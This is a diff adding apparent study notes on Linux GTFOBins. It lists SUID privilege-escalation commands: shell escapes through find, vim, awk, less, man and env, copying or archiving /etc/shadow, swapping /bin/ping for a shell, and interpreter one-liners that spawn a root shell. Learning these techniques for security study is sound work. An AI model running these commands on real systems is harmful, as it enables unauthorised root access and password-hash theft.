@@ -133,6 +133,27 @@ Even if DAC permissions allow access (e.g., root reading a file), MAC provides a
 | **File Manipulators** | `cp`, `mv`, `tar`, `nano`, `zip` | Can read/write restricted files (like overwriting `/etc/passwd`). |
 | **Interpreters** | `python`, `perl`, `ruby`, `php` | Can import OS libraries to execute system shells. |
 
+| Binary | "The ""Breakout"" Command" | Why it works |
+| :--- | :--- | :--- |
+| find | `find . -exec /bin/sh -p \; -quit` | find has an -exec flag to run commands on every file it finds. We tell it to run a shell. |
+| vim | `vim -c ':!/bin/sh'` | Vim allows you to run OS commands using !.
+| awk | `"awk 'BEGIN {system(""/bin/sh"")}'"` | awk is a scripting language; system() executes a command. |
+| less | `less /etc/profile then type !/bin/sh` | less (and more) behaves like vi. Typing ! inside the pager executes a shell command. |
+| man | `man man then type !/bin/sh` | man uses a pager (like less) to display help. You can break out of the help screen into a shell. |
+| env | `env /bin/sh -p` | "env is designed to run programs in a modified environment. If SUID it runs them as root." |
+
+| Binary | "The ""Breakout"" Command" | Why it works |
+| :--- | :--- | :--- |
+| cp | cp /etc/shadow /tmp/shadow_copy | "If cp is SUID root it can read any file. You simply copy the protected file to a place you can read."
+| mv | mv /bin/sh /bin/ping | "You could replace a common binary (like ping) with a shell so the next time root runs ping they run your shell."
+| tar | tar -cf /tmp/shadow.tar /etc/shadow | "tar can archive any file it has access to. You archive the shadow file then extract it somewhere safe to read it."
+| nano | nano /etc/shadow | "Unlike vim nano usually doesn't have a ""shell escape"" but if it's SUID you can just open and edit system files directly."
+
+Python: `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
+Perl: `perl -e 'exec "/bin/sh";'`
+Ruby: `ruby -e 'exec "/bin/sh"'`
+PHP: `php -r "pcntl_exec('/bin/sh', ['-p']);"`
+
 
 ### ❓ Q&A: Default Permissions of GTFOBins
 **Q: What are the default permissions of these "GTFOBins" commands?**
